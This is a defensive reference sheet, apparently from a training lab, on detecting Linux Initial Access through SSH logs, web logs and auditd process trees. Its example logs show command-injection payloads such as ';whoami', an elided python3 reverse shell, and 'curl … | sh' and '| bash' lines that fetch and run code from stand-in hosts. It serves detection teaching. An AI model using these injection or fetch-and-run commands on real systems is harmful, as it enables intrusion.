# 🛡️ Linux Threat Detection 1( Initial Access) — Reference Sheet

> **TL;DR:** Most Linux breaches start with a handful of well-known **Initial Access** techniques — exposed **SSH** (brute-force or stolen key), exploited **public-facing services** (command injection, vulnerable web apps), and **human-led / supply-chain** attacks. You detect SSH attacks in `auth.log` (a failed login is only an attempt — only an `Accepted` line proves a breach), spot service exploitation in app logs like `nginx/access.log`, and confirm any of them with **process-tree analysis** in auditd: trace a suspicious command up via `--pid` to its parent app, then list the app's children with `--ppid`.

## ⚠️ Gotchas

| Gotcha | Detail |
|---|---|
| `Failed` ≠ breach | A `Failed password` line only proves an *attempt*. The breaching IP is the one that later shows up in an **`Accepted`** line. Always confirm the success event. |
| A clean login can still be evil | Public-key + internal IP + a tidy 14:00 timestamp *looks* like Ansible, but you still verify the IP really is that automation server before clearing it. |
| Linux SSH logs are simpler than Windows | No logon-type codes to memorise. User + auth method + source IP + time is usually enough to triage. |
| SSH and RDP are the same MITRE technique | Both fall under **External Remote Services (T1133)** — not separate techniques. SSH is the #1 Linux Initial Access vector (~40M exposed hosts). |
| Apps never log "I'm being exploited" | Application logs give *artifacts*, not conclusions. Don't expect a zero-day to announce itself; correlate with on-host evidence. |
| Injection hides in normal-looking params | `host=;whoami` in a ping field is the tell. A `500` then a `200` shows the attacker finding the syntax that works. |
| `proctitle`, not `proctile` | The grep keyword is `proctitle`. A misspelling silently returns nothing, and `grep proctitle` only makes sense **piped from `ausearch`**. |
| The shell wrapper isn't the payload | In `/bin/sh -c "ping -c 2 ;python3 -c '...'"` the reverse-shell launcher is **python3**, not `/bin/sh`. Read the whole `proctitle`. |
| "Moving up the tree" = read `ppid` | The question "what is the PID of the app?" wants the **`ppid`** of the shell you're looking at, not its `pid`. |
| Climb until PID 1 | Keep walking up with `--pid` until you hit **PID 1** (init/systemd) to find the true origin of the activity. |
| Phishing is rare on Linux, not absent | `curl …/fix.sh | bash` from a forum and typosquats like `pip3 install fastpi` still land malware on servers. |
| Trusted app misbehaving = supply chain | If a legitimate, trusted binary suddenly runs malicious commands, suspect **Supply Chain Compromise** (XZ Utils, tj-actions). |
| Enrich before you block | Attackers proxy through benign-looking cloud IPs. Run TI/WHOIS on a source IP before acting on it. |

## 1️⃣ Initial Access via SSH (Task 2)

| Concept | Detail |
|---|---|
| Why SSH | The most common remote-access service; nearly every Internet-facing Linux box runs it. Shodan reported **~40.7 million** exposed in 2025. |
| MITRE | **T1133 — External Remote Services** (covers both SSH and RDP). |
| Two breach paths | A **stolen key** or a **breached password**. Botnets scan the Internet for exposed SSH at scale. |
| Advanced risks | Vulnerabilities in the SSH server itself (e.g. Erlang/OTP) and **SSH session hijacking** (T1563.001) — covered in later rooms. |

### How keys and passwords get compromised

| Auth type | Real-world risk |
|---|---|
| Key-based | Private keys left in a GitHub repo / Ansible server; admin laptop infected by a data stealer that exfiltrates keys. |
| Password-based | Weak password set "for a quick test" and never reverted; a contractor sets `12345678`; an old insecure SSH server accidentally exposed. |

> Most real attacks (e.g. the **Outlaw** group) start from one of these mundane mistakes, not a fancy exploit.

### Start with the SSH logs

**Purpose:** See every SSH daemon event as the baseline for SSH triage.

```bash
cat /var/log/auth.log | grep "sshd"
# Server listening, Accepted/Failed logins, session opened/closed
# Note the auth method (publickey vs password), source IP, and time
```

## 2️⃣ Detecting SSH Attacks (Task 3)

**Breach recipe:** public SSH access + password auth allowed + a weak password ⇒ it's only a matter of time. The classic pattern in logs is **brute force → successful password login**.

### Good vs bad: reading successful logins

```bash
cat /var/log/auth.log | grep -E 'Accepted'
# Accepted publickey for ansible from 10.14.105.255 ...   <- likely legit
# Accepted password  for jsmith  from 54.155.224.201 ...  <- suspicious
# Accepted password  for jsmith  from 196.251.118.184 ... <- suspicious
```

| Login | Verdict | Why |
|---|---|---|
| `publickey` · ansible · internal IP · 14:00 | Likely legit | Key-based, internal source, time matches a scheduled task — but still verify the IP is the real Ansible server. |
| `password` · jsmith · external IPs · hours apart | Red flags | Three at once: **password auth**, **external IPs**, and a **time gap** (one login lands in the user's night). |

### Four questions for any suspicious login

| Field | Ask |
|---|---|
| Username | Who owns it? Is this time/IP expected for them? |
| Source IP | What do TI tools / asset lookups say — trusted or malicious? |
| Login history | Was it preceded by brute force or other suspicious events? |
| Next steps | Is it suspicious enough to analyse the user's actions *after* the login? |

### Brute-force triage commands

**Purpose:** Find targeted users + source IPs, then prove the actual breach.

```bash
grep -E 'Accepted|Failed' /var/log/auth.log
# Overview of both successes and failures (spot the brute-force burst)

grep 'Failed password' /var/log/auth.log
# Lists every attempt -> reveals which usernames + IPs were hammered

grep 'Accepted password for root' /var/log/auth.log
# The proof: a successful root login = the breaching IP
# e.g. Accepted password for root from 91.224.92.79 port 51555 ssh2

grep -E 'Accepted|session opened' /var/log/auth.log
# Cross-check successful logins against session establishment
```

> **Logic that matters:** many IPs *try* root (193.46.255.33, 45.88.8.186, 80.94.93.233, 91.224.92.79…). Only the one that later appears in an **`Accepted password for root`** line is the confirmed breach.

## 3️⃣ Initial Access via Services (Task 4)

| Concept | Detail |
|---|---|
| Why it matters | Linux hosts web/email/DB servers and is the core of most firewall/VPN software. Compromise one service → the **whole host** is at risk. |
| MITRE | **T1190 — Exploit Public-Facing Application**. |

### Real-world service breaches

| Target | Outcome |
|---|---|
| Zimbra Collaboration CVE | Arbitrary OS command execution |
| Exposed Docker API port | Entry point for cloud-infrastructure breaches |
| Palo Alto firewall CVE | Full control of the Linux-based firewall OS |
| WordPress "plugins" feature | Abused to upload web shells |

### Which log for which attack

| Log | Detects |
|---|---|
| Web logs | A variety of web attacks (injection, path probing) |
| Database logs | Suspicious SQL queries |
| VPN logs | Abnormal VPN login events |
| Other app logs | Domain-specific events (e.g. bank transactions) |

> App logs **rarely tell the full story** — they won't say "I'm being exploited" — but they hold unique artifacts worth correlating.

### Command injection in web logs (TryPingMe)

The app runs `ping -c 2 [YOUR-INPUT]` with **no input filtering** → command injection.

**Purpose:** Spot OS commands smuggled into request parameters.

```bash
cat /var/log/nginx/access.log
# GET /ping?host=3.109.33.76        200   <- normal usage
# GET /ping?host=hello              500   <- attacker probing (bad input)
# GET /ping?host=whoami             500   <- still no injection char
# GET /ping?host=;whoami            200   <- ';' breaks out -> injection works!
# GET /ping?host=;ls                200   <- enumerating
# GET /ping?host=;cat /opt/trypingme/main.py   <- reading the app source
```

What the web logs alone tell you: `10.14.105.255` is likely the attacker, `/ping` allows code execution, the attacker ran `whoami`/`ls`, and the host is now at risk.

## 4️⃣ Detecting Service Breach — Process Tree (Task 5)

When app logs aren't enough, **process-tree analysis** is the universal method: take a suspicious command and trace it back to the app/user that spawned it.

### Field cheat-sheet

| Field | Meaning |
|---|---|
| `pid` | Process ID — the process you're currently looking at |
| `ppid` | Parent Process ID — the process that started it ("up the tree") |
| `proctitle` | The actual command line that ran, with arguments |

### Walking the tree

**Purpose:** Find a command, climb to its parent app, then enumerate the app's children.

```bash
ausearch -i -x whoami
# -x filters by the executable name; shows ppid/pid for the whoami event

ausearch -i --pid 1018
# Show the event for a given PID; read its 'ppid' to go one level up
# proctitle=/bin/sh -c "ping -c 2 ;whoami"   ppid=577 pid=1018

ausearch -i --ppid 577 | grep 'proctitle'
# List every child process of the app PID -> spot malicious commands
# (pipe to 'sort -u' for unique command lines: | grep proctitle | sort -u)
```

### The TryPingMe breach chain (lab)

```
PID 1   systemd / init
 └─ PID 577   python3 /opt/trypingme/main.py        ← TryPingMe app (entry point)
      ├─ PID 1018  /bin/sh -c "ping -c 2 ;whoami"
      │     └─ PID 1020  whoami
      └─ /bin/sh -c "ping -c 2 ;python3 -c '<reverse shell payload>'"   ← reverse shell (python3)
```

> Teaching example in the room used `/opt/mywebapp/app.py` and ended on a malicious `curl http://…-bot.thm | sh`. The **lab answer** chain is the TryPingMe one above.

## 5️⃣ Advanced Initial Access (Task 6)

### Human-led attacks (rare on Linux, still real)

| Scenario | Why it bites |
|---|---|
| `curl https://shadyforum.thm/fix.sh | bash` | IT member runs an unread forum "fix" — it's malware. |
| `pip3 install fastpi` (meant `fastapi`) | **Typosquatting** — the mistyped package was attacker-published malware. |

### Supply Chain Compromise (T1195)

Breach the software first, then infect all its users via a malicious update. A Linux server pulls in **hundreds of dependencies** from many maintainers, so the attack can come from anywhere.

| Case | Impact |
|---|---|
| **XZ Utils** backdoor | Part of SSH; nearly breached millions of Linux servers. |
| **tj-actions** breach | Leaked thousands of secrets (SSH keys, access tokens). |

### Detection method (all of the above)

Start with a **trigger** (SIEM alert on a suspicious command, or a connection to a known-malicious IP) → build a **process tree** to see which app/user initiated it → decide legitimate vs malicious.
